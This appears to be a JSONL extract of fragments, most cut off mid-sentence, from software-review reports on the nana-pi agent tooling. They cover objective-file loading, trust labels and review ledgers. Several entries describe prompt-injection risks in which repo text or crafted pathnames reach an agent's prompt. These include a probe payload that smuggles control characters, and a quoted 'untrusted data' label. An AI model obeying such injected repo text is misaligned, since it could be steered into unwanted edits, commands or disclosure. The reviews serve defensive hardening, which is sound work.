+{"report":"t2a-astra-land","reason":"notes_section","section":"other","text":"**Universal parity and “never stalls” remain overclaims:** tests drive registered handlers, not complete host rendering; synchronous filesystem operations have "}
+{"report":"t2a-astra-land","reason":"unlabeled_paragraph","section":"other","text":"**B — Enumeration is incomplete; inherited surfaces are carries, not T2a blockers.**"}
+{"report":"t2a-astra-land","reason":"notes_section","section":"other","text":"The four discovered channels are addressed in the inspected objective/config paths."}
+{"report":"t2a-astra-land","reason":"notes_section","section":"other","text":"`extensions/nana-post-edit.ts:496–503` exposes the raw filename in **both** a notification and model-visible tool-result text."}
+{"report":"t2a-astra-land","reason":"notes_section","section":"other","text":"`nana-handoff.ts:97` delegates its separate `displayPath()` to an unsanitized locator renderer. Its escaping rules are not the objective sanitizer’s rules."}
+{"report":"t2a-astra-land","reason":"notes_section","section":"other","text":"Pi’s final rendering of block reasons remains unverified."}
+{"report":"t2a-astra-land","reason":"notes_section","section":"other","text":"Commission a separate cross-cutting sanitization lane covering prompts, tool results, notifications, status and error paths. Do not blindly replace handoff loca"}
+{"report":"t2a-astra-land","reason":"unlabeled_paragraph","section":"other","text":"**C — Compatibility and harm.**"}
+{"report":"t2a-astra-land","reason":"notes_section","section":"other","text":"Fresh/no-config **pi** sessions newly treat repo objectives as governing; Claude already walked upward. This increases semantic prompt-injection exposure, despi"}
+{"report":"t2a-astra-land","reason":"notes_section","section":"other","text":"Claude’s fallback now follows user configuration/default `~/.pi/agent/nana-objective.md`, rather than hardcoding `~/nana-agent-loop/OBJECTIVE.md`."}
+{"report":"t2a-astra-land","reason":"notes_section","section":"other","text":"Basename-only `projectFile` breaks previously accepted path-valued settings. That tightening is reasonable but must be diagnosed accurately."}
+{"report":"t2a-astra-land","reason":"notes_section","section":"other","text":"The inspected `~/nana-agent-loop/OBJECTIVE.md` Rules rewrite matches the intended hierarchy and retains Jake’s authority over new product lanes. It does not imp"}
+{"report":"t2a-astra-land","reason":"notes_section","section":"other","text":"Rules/prose formerly injected by pi are intentionally no longer included."}
+{"report":"t2a-astra-land","reason":"unlabeled_paragraph","section":"other","text":"**D — Consumer declarations are incomplete.**"}
+{"report":"t2a-astra-land","reason":"notes_section","section":"other","text":"Pack README and the objective interface comment in `config.ts` describe the principal changes."}
+{"report":"t2a-astra-land","reason":"notes_section","section":"other","text":"Root `AGENTS.md` and `templates/_shared/working-under-nana-pi.md` omit the objective contract. The shared objective seed omits the displayed umbrella priority a"}
+{"report":"t2a-astra-land","reason":"notes_section","section":"other","text":"`doctor.mjs:95–98` labels `../OBJECTIVE.md` a successful rename, although the producer rejects it."}
+{"report":"t2a-astra-land","reason":"notes_section","section":"other","text":"The hook now needs automatic TypeScript stripping; its CLI specifies Node ≥22.18, while setup README still promises Node ≥22."}
+{"report":"t2a-astra-land","reason":"unlabeled_paragraph","section":"other","text":"**E — Seat conduct.**"}
+{"report":"t2a-astra-land","reason":"notes_section","section":"other","text":"Correcting “zero attacker bytes” to “no attacker-controlled structure” was justified and explicit—not evidence that semantic injection is solved."}
+{"report":"t2a-astra-land","reason":"notes_section","section":"other","text":"Finding the fresh-machine regression before review was valuable. The original brief’s simultaneous walk-up and opt-in language contributed ambiguity; the correc"}
+{"report":"t2a-astra-land","reason":"notes_section","section":"other","text":"Implementation after the sol cap is legitimate; it is not another sol approval. Final fallback/host-rendering claims remain unverified."}
+{"report":"t2a-astra-land","reason":"notes_section","section":"other","text":"No basis to declare trust-vs-label settled. Record Jake’s pending decision and the exposure explicitly; do not substitute astra’s preferred trust policy."}
+{"report":"t2a-astra-land","reason":"notes_section","section":"other","text":"The advisory size ceiling was crossed after r1 without the required checkpoint appearing in these reports."}
+{"report":"t2a-astra-land","reason":"unlabeled_paragraph","section":"other","text":"**F — Parallel landing.**"}
+{"report":"t2a-astra-land","reason":"notes_section","section":"other","text":"Protect `lib/config.ts` normalization, user-only objective merge, sanitized diagnostics and `loadUserObjective()` during integration; whole-file conflict resolu"}
+{"report":"t2a-astra-land","reason":"notes_section","section":"other","text":"The supplied T2b r4 patch and inspected T2b config do **not** substantiate the claimed config overlap. README/HANDOFF overlap is visible. Verify actual landing "}
+{"report":"t2a-astra-land","reason":"label","section":"must","text":"MUST:"}
+{"report":"t2a-astra-land","reason":"label","section":"carry","text":"CARRY:"}
+{"report":"t2a-astra-r2","reason":"prose","section":"other","text":"Read-only review; tests not rerun. Acceptance evidence: seat-verified **70 files / 3514 checks / exit 0**."}
+{"report":"t2a-astra-r2","reason":"unlabeled_paragraph","section":"other","text":"**HANDOFF sufficiency:** Yes—as an open-decision record, not as policy implementation or risk acceptance. Its structural-safety claim must be read as objective-"}
+{"report":"t2a-astra-r2","reason":"label","section":"findings","text":"**New defects:** No new blocking defect found. Doctor’s own-PATH check (`doctor.mjs:66–78`) cannot certify Claude Code’s runtime. Raising the floor exercises th"}
+{"report":"t2a-astra-r2","reason":"label","section":"must","text":"MUST: []"}
+{"report":"t2a-astra-r2","reason":"label","section":"carry","text":"CARRY:"}
+{"report":"t2a-sol-r1","reason":"notes_section","section":"other","text":"**R2 regression fix verified:** current golden corpus passed 141 checks. Replaying its tests against r1’s `objective.ts` exited 8 and failed the fresh-machine p"}
+{"report":"t2a-sol-r1","reason":"notes_section","section":"other","text":"**Vacuous checks independently mutation-tested:**"}
+{"report":"t2a-sol-r1","reason":"notes_section","section":"other","text":"**R2 guards:** no regular-file, 256 KiB read, symlink, 12,000-output mechanism, or catch was removed. FIFO, directory, 300 MiB file, symlink cwd, deleted cwd, C"}
+{"report":"t2a-sol-r1","reason":"notes_section","section":"other","text":"**Stale `PWD`:** `env PWD=/elsewhere bash hook` was corrected by Bash to the actual cwd; the product objective was found. The worker’s doubt is refuted on the t"}
+{"report":"t2a-sol-r1","reason":"notes_section","section":"other","text":"**Compatibility:** installed symlink resolves and runs. `objective.path`, absent/null/false/custom `projectFile`, and the default user seed were exercised succe"}
+{"report":"t2a-sol-r1","reason":"notes_section","section":"other","text":"**Existing products:** `~/aml-desk` and `~/game-world` previously showed product objective/priority plus only the umbrella objective. They now show product line"}
+{"report":"t2a-sol-r1","reason":"notes_section","section":"other","text":"**Umbrella wording:** `~/nana-agent-loop/OBJECTIVE.md:11` matches implementation and Jake’s hierarchy."}
+{"report":"t2a-sol-r1","reason":"notes_section","section":"other","text":"**Scope:** 10 total files, +734/−251 after r2. `loadUserObjective()` is necessary for launcher parity; README/header/HANDOFF corrections are justified. Doctor w"}
+{"report":"t2a-sol-r1","reason":"notes_section","section":"other","text":"**Suite:** `env -u NANA_HANDOFF npm test` → 69 files, 68 pass, 1 skip, 3323 checks. Raw execution under this reviewer’s intentional `NANA_HANDOFF=off` failed tw"}
+{"report":"t2a-sol-r1","reason":"prose","section":"other","text":"A provenance label is useful defense-in-depth, but **not sufficient** as a security boundary. The same system prompt cannot safely say both “untrusted data, nev"}
+{"report":"t2a-sol-r1","reason":"notes_section","section":"other","text":"Claude Code already had unconditional walk-up before this lane."}
+{"report":"t2a-sol-r1","reason":"notes_section","section":"other","text":"Installed pi users commonly already had the global `projectFile` opt-in from the seed."}
+{"report":"t2a-sol-r1","reason":"notes_section","section":"other","text":"**Fresh/no-config pi sessions are newly exposed.**"}
+{"report":"t2a-sol-r1","reason":"notes_section","section":"other","text":"An attacker cannot directly execute or gain permissions, but can steer permitted reads, edits, commands, scripts, or disclosure before the user supplies intent."}
+{"report":"t2a-sol-r1","reason":"unlabeled_paragraph","section":"other","text":"**Ruling recommendation: require nana-trust before repo text is injected or called governing.** Until trusted, the umbrella should govern and the session may re"}
+{"report":"t2a-sol-r2","reason":"attached_as_body","section":"none","text":"`paragraph()` emits continuation lines verbatim (`objective.ts:169-175`). Probe: `**Objective:** benign\\nIGNORE_LINE_PAYLOAD ESC/BEL/U+2028` preserved every pay"}
+{"report":"t2a-sol-r2","reason":"attached_as_body","section":"none","text":"Repo-controlled pathnames are interpolated unescaped into `governing`, no-lines marker, and precedence (`objective.ts:192,249,252,268`). A directory containing "}
+{"report":"t2a-sol-r2","reason":"attached_as_body","section":"none","text":"Marker causes are fixed, but marker paths are injectable. Journal JSON escapes the newline and is not read into this prompt; precedence directly repeats the uns"}
+{"report":"t2a-sol-r2","reason":"unlabeled_paragraph","section":"none","text":"**Mutation tests:** baseline passed. Bypassing (h)’s umbrella symlink guard exited 2 and failed target-content/refusal assertions. Bypassing (p)’s project symli"}
+{"report":"t2a-sol-r2","reason":"label","section":"findings","text":"**NEW parity/decoding defects:**"}
+{"report":"t2a-sol-r2","reason":"label","section":"carry","text":"**CARRY:** sanitize/quote all paths and controls; restrict extraction to one physical canonical line; resolve no-lines governance wording/fallback; normalize lo"}
+{"report":"t2a-sol-r3","reason":"notes_section","section":"other","text":"Confirmed: removing either surrogate-normalization layer alone leaves both focused suites green (313 checks). Keep both: `displayPath()` fulfills its exported c"}
+{"report":"t2a-sol-r3","reason":"notes_section","section":"other","text":"Focused objective suites: 313/313 passed."}
+{"report":"t2b-astra-land","reason":"unlabeled_paragraph","section":"none","text":"**T2b should not merge unchanged.** The mechanism is substantially improved; two implementation gaps remain in promised safeguards."}
+{"report":"t2b-astra-land","reason":"prose","section":"none","text":"Read the corpus in order, then the patch and named source/tests. This is static verification; the 69-file/3317-check pass and race-test sensitivity are seat-sup"}
+{"report":"t2b-astra-land","reason":"unlabeled_paragraph","section":"none","text":"**A. Contract**"}
+{"report":"t2b-astra-land","reason":"unlabeled","section":"none","text":"Identity and counting substantially satisfy the amended contract: normalized, bounded slug; real git-common-dir scope; distinct HEAD/snapshot revisions across r"}
+{"report":"t2b-astra-land","reason":"unlabeled","section":"none","text":"Reservations serialize ordinary last-slot competition; completion checks ownership; heartbeat and dead-owner recovery are implemented. Unconditional atomicity r"}
+{"report":"t2b-astra-land","reason":"unlabeled","section":"none","text":"Launcher independence means **participating launchers**, not universal enforcement. The shared `run` wrapper is real; `check` alone is not admission."}
+{"report":"t2b-astra-land","reason":"unlabeled","section":"none","text":"Overrides are timestamped. Audit rotation preserves the permanent tally, but storage is **not globally bounded**, and failed overrides bypass even audit rotatio"}
+{"report":"t2b-astra-land","reason":"unlabeled","section":"none","text":"“Completed verdict” remains a token heuristic. Endpoint snapshot equality does not prove the tree stayed unchanged throughout review; edit-and-revert and concur"}
+{"report":"t2b-astra-land","reason":"unlabeled_paragraph","section":"none","text":"**B. Governance honesty**"}
+{"report":"t2b-astra-land","reason":"unlabeled","section":"none","text":"The bold, dedicated README trust-model section is sufficiently prominent and correctly disclaims security enforcement."}
+{"report":"t2b-astra-land","reason":"unlabeled","section":"none","text":"Qualify “every admitted review … recorded”: ordinary failed admissions leave no durable audit after reservation removal. Budget control is external; these wrapp"}
+{"report":"t2b-astra-land","reason":"unlabeled","section":"none","text":"Other overstatements: “casefold” is actually lowercase normalization; staging independence has the force-added ignored-file exception; “only completed verdicts”"}
+{"report":"t2b-astra-land","reason":"unlabeled_paragraph","section":"none","text":"**C. Migration and harm**"}
+{"report":"t2b-astra-land","reason":"unlabeled","section":"none","text":"Missing `--item` is genuinely diagnosable: exit 1 names the required flag, ledger and remedy before spawning. The nana-agent-loop forwarder preserves stderr/sta"}
+{"report":"t2b-astra-land","reason":"unlabeled","section":"none","text":"The inventory, worker symlink instruction and explicit retry notice are published."}
+{"report":"t2b-astra-land","reason":"unlabeled","section":"none","text":"However, both named jev worker scripts already pass `--retries 2`. “Arguments otherwise unchanged” now means **three mutation attempts**, not the worker’s safe "}
+{"report":"t2b-astra-land","reason":"unlabeled","section":"none","text":"Install `~/.local/bin/pi-worker` and coordinate external scripts/reference documents on landing day; workers must **not** receive `--item` or `--worker`."}
+{"report":"t2b-astra-land","reason":"unlabeled_paragraph","section":"none","text":"**D. Snapshot ruling**"}
+{"report":"t2b-astra-land","reason":"unlabeled","section":"none","text":"Keep raw-byte identity. LFS/autocrlf can create an additional identity relative to bare HEAD—not another charge on every identical rerun. Cost: potentially one "}
+{"report":"t2b-astra-land","reason":"unlabeled","section":"none","text":"Force-added, not-yet-committed ignored files and global excludes can split or omit states. **MED:** accidental slot consumption or missed changes; publish these"}
+{"report":"t2b-astra-land","reason":"unlabeled","section":"none","text":"Non-UTF-8 refusal is safe but excludes affected repositories; the replacement-character check also rejects a valid literal U+FFFD filename. **LOW availability c"}
+{"report":"t2b-astra-land","reason":"unlabeled","section":"none","text":"Full reads at admission/completion are acceptable at the reported 685 files/0.16 s, not a scalability guarantee; large files/LFS and serialized completion hashi"}
+{"report":"t2b-astra-land","reason":"unlabeled_paragraph","section":"none","text":"**E. Seat conduct**"}
+{"report":"t2b-astra-land","reason":"unlabeled","section":"none","text":"Correcting the diff-hash ruling and accepting the worker’s dirty-tree objection strengthened the contract. Role-max subtraction and worker separation are legiti"}
+{"report":"t2b-astra-land","reason":"unlabeled","section":"none","text":"Implementing after sol r3, followed by this independent ruling, respects the stated cap exception."}
+{"report":"t2b-astra-land","reason":"unlabeled","section":"none","text":"The final completion-race fix has meaningful sensitivity evidence. But tracked-output resolution was declared closed without final-symlink coverage."}
+{"report":"t2b-astra-land","reason":"unlabeled","section":"none","text":"`tests/review-ledger.test.mjs:306` captures its “before” tally **after** `check`; that equality assertion is vacuous. The restored compatibility/blank-override "}
+{"report":"t2b-astra-land","reason":"unlabeled","section":"none","text":"I accept silence for ignored in-tree outputs: they are the recommended safe location, unlike ordinary untracked outputs."}
+{"report":"t2b-astra-land","reason":"unlabeled_paragraph","section":"none","text":"**F. Integration**"}
+{"report":"t2b-astra-land","reason":"unlabeled","section":"none","text":"The supplied “both touch `lib/config.ts`” premise does not match `t2b-r5.patch`: it has no config hunk; T2b’s inspected config matches main. Preserve T2a’s obje"}
+{"report":"t2b-astra-land","reason":"unlabeled","section":"none","text":"README/package metadata need integration. The supplied patch also deletes main’s two unrelated `HANDOFF.md` notices; preserve them."}
+{"report":"t2b-astra-land","reason":"unlabeled","section":"none","text":"Re-run root `npm test`, review-ledger/round, handoff-writer-role, config normalization/trust/fallback/display and objective golden/injection tests on the merged"}
+{"report":"t2b-astra-land","reason":"label","section":"must","text":"MUST:"}
+{"report":"t2b-astra-land","reason":"label","section":"carry","text":"CARRY:"}
+{"report":"t2b-astra-land","reason":"label_other","section":"other","text":"UPSTREAM-CONTRACT: Nana’s CLI/governance contract changes: required item, revision-based rounds, unverified-completion charging, separate worker launcher, N+1 r"}
+{"report":"t2b-astra-r2","reason":"prose","section":"none","text":"Round 2 — serves the priority of making nana-pi consistent, coherent and effective."}
+{"report":"t2b-astra-r2","reason":"prose","section":"none","text":"Paths below are relative to `packages/nana-pack/`."}
+{"report":"t2b-astra-r2","reason":"label","section":"findings","text":"**New-defect assessment:** No new blocker found."}
+{"report":"t2b-astra-r2","reason":"label","section":"must","text":"MUST:"}
+{"report":"t2b-astra-r2","reason":"label","section":"carry","text":"CARRY: Document/test the force-added ignored-file exception; strengthen the non-mutating-check test; execute README migration, install the `pi-worker` symlink, "}
+{"report":"t2b-sol-r1","reason":"prose","section":"other","text":"The custom lock and reservation are justified by the atomicity requirement, but the overrun was not merely mechanical: identity, counting, rotation, and reserva"}
+{"report":"t2b-sol-r1","reason":"notes_section","section":"other","text":"`~/nana-agent-loop/app/scripts/pi-review.mjs`: forwards argv unchanged; after landing, old invocations receive the clear required-item error. The forwarder itse"}
+{"report":"t2b-sol-r1","reason":"notes_section","section":"other","text":"`~/nana-agent-loop/app/scripts/launch-loop.mjs`: not a `pi-review` callsite; line 88 only mentions the historical “pi-reviewer-judge” feature. No migration need"}
+{"report":"t2b-sol-r1","reason":"notes_section","section":"other","text":"`~/jev-research/docs/reviews/local-tool-judge-2026-09-19/launch-workers.sh:11`: add stable `--item … --worker`."}
+{"report":"t2b-sol-r1","reason":"notes_section","section":"other","text":"`~/jev-research/experiments/launch-wp-h-after-primary.sh:7`: add stable `--item … --worker`."}
+{"report":"t2b-sol-r1","reason":"notes_section","section":"other","text":"`~/jev-research/docs/reviews/local-tool-judge-2026-09-19/launch-sol-review.sh:8`: additionally found; add stable `--item … --role sol`."}
+{"report":"t2b-sol-r1","reason":"notes_section","section":"other","text":"`~/.claude/nana-memory/shared/reference_pi_review_procedure.md:22,79`: publishes the old invocation and basename rule; update it, including worker instructions."}
+{"report":"t2b-sol-r1","reason":"notes_section","section":"other","text":"`~/nana-agent-loop/loops/system-map.components.json:1406-1408`: old CLI/export contract; update with the coordinated API migration."}
+{"report":"t2b-sol-r1","reason":"notes_section","section":"other","text":"Detached jev scripts will put the required-item diagnostic in their runner logs, although the parent shell still prints “launched.”"}
+{"report":"t2b-sol-r2","reason":"attached_as_body","section":"none","text":"`pi-worker` can intentionally run a review prompt and accept review-shaped output, but records no admission; direct `pi` can too. That is the documented self-go"}
+{"report":"t2b-sol-r2","reason":"label","section":"carry","text":"**CARRY for astra:** fail-closed diff errors; canonical snapshot semantics/full hash; stage-only invariant; submodules/EOL/modes/untracked tests; completion sta"}
+{"report":"t2b-sol-r3","reason":"unlabeled_paragraph","section":"none","text":"**Clean-definition ruling: KEEP RAW-BYTE IDENTITY.** A review identity should represent bytes the reviewer could observe, not Git’s normalized equivalence. Filt"}
+{"report":"t2b-sol-r3","reason":"unlabeled_paragraph","section":"none","text":"**Output-in-tree ruling: WARN, with one refusal case.** Warn whenever `--out` is inside the reviewed tree and recommend an external or ignored location. Refuse "}
+{"report":"t2b-sol-r3","reason":"label","section":"findings","text":"**NEW MED:** Completion has a TOCTOU window: revision is derived before acquiring the ledger lock (`review-round.mjs:469-471`), so an edit while waiting can sti"}
+{"report":"t2b-sol-r3","reason":"label","section":"findings","text":"**NEW LOW:** Explicit `pi-review --retries N` now performs one additional attempt versus the old contract. No production call site in this repository supplies i"}
+{"report":"t2b-sol-r3","reason":"label","section":"carry","text":"**CARRY for astra:**"}
+{"report":"t2c-astra-land","reason":"prose","section":"other","text":"Read the corpus in order, then the patch, implementation, tests, declarations and installed pi trust/locking code. Read-only; no tests rerun. **71 files / 4262 "}
+{"report":"t2c-astra-land","reason":"notes_section","section":"other","text":"Affirmative-only, nearest-record semantics, decline precedence, umbrella exemption and unusable-store labelling are implemented. Resources and live auto-trust c"}
+{"report":"t2c-astra-land","reason":"notes_section","section":"other","text":"One producer preserves extraction, sanitization, unconditional walk-up and precedence. Golden tests compare both adapters without concealing newline differences"}
+{"report":"t2c-astra-land","reason":"notes_section","section":"other","text":"README honestly records Jake’s label-only decision and residual semantic injection. I do **not** substitute trust-gating."}
+{"report":"t2c-astra-land","reason":"notes_section","section":"other","text":"Universal parity is unproved: the relative-override test exercises only the predicate; foreign ownership is mocked in-process. Actual-host rendering, Windows, A"}
+{"report":"t2c-astra-land","reason":"notes_section","section":"other","text":"**Read-only store file, writable folder:** clearing on a readable affirmative is correct; pi locks beside the file and need not rewrite it."}
+{"report":"t2c-astra-land","reason":"notes_section","section":"other","text":"**Read-only volume / ACLs / root:** `accessSync(W_OK|X_OK)` is a preflight, not proof that lock creation succeeds. Root may legitimately bypass mode bits; skipp"}
+{"report":"t2c-astra-land","reason":"notes_section","section":"other","text":"**Staleness:** README acknowledges it, but emitted removal advice does not tell the owner to recheck or back up. Removing a subsequently repaired store loses de"}
+{"report":"t2c-astra-land","reason":"prose","section":"other","text":"Labelling `~/aml-desk`, `~/the-hive` and other unconfirmed repos is the correct default under Jake’s ruling. “Could not confirm” appropriately avoids claiming m"}
+{"report":"t2c-astra-land","reason":"prose","section":"other","text":"Four specification errors caught downstream indicate inadequate contract derivation, not four unforeseeable edge cases. The seat should have traced `/trust` thr"}
+{"report":"t2c-astra-land","reason":"prose","section":"other","text":"Sharing `piAgentDir()` improves gate/objective consistency and fixes tilde protection. T2b is untouched."}
+{"report":"t2c-astra-land","reason":"label","section":"must","text":"MUST:"}
+{"report":"t2c-astra-land","reason":"label","section":"carry","text":"CARRY:"}
+{"report":"t2c-astra-r2","reason":"unlabeled_paragraph","section":"none","text":"**Empty-lock ruling: BLOCKER, not an accepted transient residual.**"}
+{"report":"t2c-astra-r2","reason":"prose","section":"none","text":"`objective.ts:312` equates empty with usable; pi’s `proper-lockfile/lib/lockfile.js:65–85` requires staleness before takeover."}
+{"report":"t2c-astra-r2","reason":"prose","section":"none","text":"A fresh empty directory can outlast pi’s approximately 180 ms retry window; a future timestamp prolongs failure until that timestamp plus the stale interval—not"}
+{"report":"t2c-astra-r2","reason":"prose","section":"none","text":"With recorded `true`, nana suppresses the label while pi’s lookup throws. A startup-only verdict also means a transient obstruction can produce a session-long m"}
+{"report":"t2c-astra-r2","reason":"prose","section":"none","text":"Conservatively retain the label for an occupied lock unless usability is established; advise waiting/rechecking, not moving a potentially live lock."}
+{"report":"t2c-astra-r2","reason":"prose","section":"none","text":"Add fresh/future/stale empty-directory tests against pi’s `get()`/`set()` and both runtime outputs. T17 currently covers only the stale-empty success case."}
+{"report":"t2c-astra-r2","reason":"label","section":"findings","text":"**NEW:** No independent blocker established beyond this remaining MUST-2 case."}
+{"report":"t2c-astra-r2","reason":"unlabeled_paragraph","section":"other","text":"**Process:** Credit the structural trace rule and checkpoint stop; neither waives a demonstrated contract failure."}
+{"report":"t2c-astra-r2","reason":"label","section":"carry","text":"**CARRY:** Broken `trust.json` symlink diagnosis/remediation; writability checks remain pre-checks, not proof; Claude-hook relative-override resolution against "}
+{"report":"t2c-astra-r2","reason":"prose","section":"carry","text":"The landed `packages/nana-pack/lib/config.ts:276` deny-policy inconsistency remains a **separate urgent item**, not an additional T2c blocker."}
+{"report":"t2c-astra-r2","reason":"label","section":"must","text":"MUST: Close empty-lock false affirmation; correct corresponding documentation and add regression coverage."}
+{"report":"t2c-astra-r2","reason":"label","section":"carry","text":"CARRY: Store-symlink remedy; writability pre-check limits; hook-cwd parity; urgent separate deny-policy fix."}
+{"report":"t2c-astra-r3","reason":"attached_as_body","section":"none","text":"**Comparison limit:** `objective.ts:304` overclaims monotonicity: wall-clock rollback or an intervening lock update can invalidate staleness. The comparison its"}
+{"report":"t2c-astra-r3","reason":"attached_as_body","section":"none","text":"README and `AGENTS.md` now correctly reject fresh/future empty locks. Seat reports 4,457 passing checks; I inspected source/tests, not reran them."}
+{"report":"t2c-astra-r3","reason":"label","section":"must","text":"MUST: []"}
+{"report":"t2c-astra-r3","reason":"label","section":"carry","text":"CARRY: Broken `trust.json` symlink diagnosis; writability/staleness pre-checks are not proof; Claude-hook relative-override cwd resolution; qualify lock-holder/"}
+{"report":"t2c-sol-r1","reason":"notes_section","section":"other","text":"**Scope:** final diff is 3 files, +249/−9; within appetite. No trust gating, precedence change, governing-file change, or parsed-line change found. Every probe "}
+{"report":"t2c-sol-r1","reason":"notes_section","section":"other","text":"**Trust shapes executed:** folder/ancestor affirmative, `null` fall-through, nearer `false`, BOM, symlinked store, directory, mode 000, FIFO, >1 MiB, trailing-s"}
+{"report":"t2c-sol-r1","reason":"notes_section","section":"other","text":"**Runtime parity:** CLI and pi output were byte-identical across all custom trust-shape cases, including labelled and unlabelled cases."}
+{"report":"t2c-sol-r1","reason":"notes_section","section":"other","text":"**Spoofing:** objective text, filename, directory name, and crafted `projectFile` could not create or suppress a real label; control-bearing paths were escaped."}
+{"report":"t2c-sol-r1","reason":"notes_section","section":"other","text":"**Canonical keys:** rejecting hand-written non-canonical keys is correct pi parity. Pi canonicalizes keys when `/trust` writes them and performs exact lookup af"}
+{"report":"t2c-sol-r1","reason":"notes_section","section":"other","text":"**Real repos:** with no real `~/.pi/agent/trust.json`, the candidate labels both `~/aml-desk` and `~/the-hive` while continuing to make their objectives govern."}
+{"report":"t2c-sol-r1","reason":"notes_section","section":"other","text":"**Risk acceptance:** `packages/nana-pack/README.md:556-562` plainly says the label is “defence in depth, NOT a security boundary,” that a model may follow attac"}
+{"report":"t2c-sol-r1","reason":"notes_section","section":"other","text":"**Tests:** objective golden corpus: 524 pass, 0 fail. A full run under the mandated synthetic HOME hit two unrelated handoff tests; both failures reproduce on m"}
+{"report":"t2c-sol-r2","reason":"attached_as_body","section":"none","text":"With malformed JSON, pi’s `/trust` calls `trustStore.getEntry(cwd)` before showing its selector (`interactive-mode.js:4298-4301`); that throws, and `setMany` li"}
+{"report":"t2c-sol-r2","reason":"attached_as_body","section":"none","text":"Foreign-owned/unwritable stores can fail similarly; a legitimately still-over-1-MiB store may remain rejected after pi rewrites it. Thus a real owner can follow"}
+{"report":"t2c-sol-r2","reason":"attached_as_body","section":"none","text":"**Verified positive cases:** ordinary “Trust” works; “Trust parent folder” also works because it records the canonical parent and removes the cwd entry (`trust-"}
+{"report":"t2c-sol-r2","reason":"attached_as_body","section":"none","text":"A symlinked start path works: pi canonicalizes on write and nana canonicalizes on lookup."}
+{"report":"t2c-sol-r2","reason":"attached_as_body","section":"none","text":"A governing file selected by `objective.projectFile` works because remediation and lookup use `path.dirname(governing)`, independent of filename."}
+{"report":"t2c-sol-r2","reason":"attached_as_body","section":"none","text":"Golden corpus independently rerun: **541 PASS**."}
+{"report":"t2c-sol-r2","reason":"attached_as_body","section":"none","text":"Deferred `nana-setup trust <dir>` is a **follow-up, not itself a blocker**; truthful built-in recovery text is sufficient to land."}
+{"report":"t2c-sol-r3","reason":"attached_as_body","section":"none","text":"`trustRecord()` always reads `~/.pi/agent/trust.json` (`objective.ts:78,294`), while pi’s `getAgentDir()` honors `PI_CODING_AGENT_DIR` (`config.js:421-425`)."}
+{"report":"t2c-sol-r3","reason":"attached_as_body","section":"none","text":"Probe: with an affirmative record in the overridden store, `trustRecord(project)` returned `vouched:false` and named the absent default store."}
+{"report":"t2c-sol-r3","reason":"attached_as_body","section":"none","text":"Therefore `/trust` writes the overridden store, restart rereads the default store, and the label persists indefinitely. Conversely, a stale default `true` can s"}
+{"report":"t2c-sol-r3","reason":"attached_as_body","section":"none","text":"This is a real supported configuration already recognized elsewhere by nana-pack’s gate."}
+{"report":"t2c-sol-r3","reason":"attached_as_body","section":"none","text":"Missing `~/.pi/agent` is fine only when HOME is writable; an unwritable parent/read-only volume makes both remediation forms fail. Foreign ownership is removabl"}
+{"report":"t2c-sol-r3","reason":"attached_as_body","section":"none","text":"Valid-JSON wrong-shape → `malformed` is acceptable schema terminology; parent-not-directory → `unreadable` is misleading."}
+{"report":"t2c-sol-r3","reason":"attached_as_body","section":"none","text":"A valid oversized store can be compacted below 1 MiB by pi’s rewrite; thus README’s categorical claim that pi’s write “cannot fix … size” is false, though the e"}
+{"report":"t2c-sol-r3","reason":"attached_as_body","section":"none","text":"The race remains: a store repaired after nana’s read can make the destructive remove advice stale. The loss consequence itself is stated clearly."}
+{"report":"t2c-sol-r3","reason":"attached_as_body","section":"none","text":"Other surfaces faithfully repeat the design, but `AGENTS.md`/README hard-code the wrong store and `project.mjs:309` overclaims that the label always says how to"}
+{"report":"t2c-sol-r3","reason":"attached_as_body","section":"none","text":"Deferred `nana-setup trust <dir>` should remain follow-up; it does not substitute for truthful built-in remediation."}
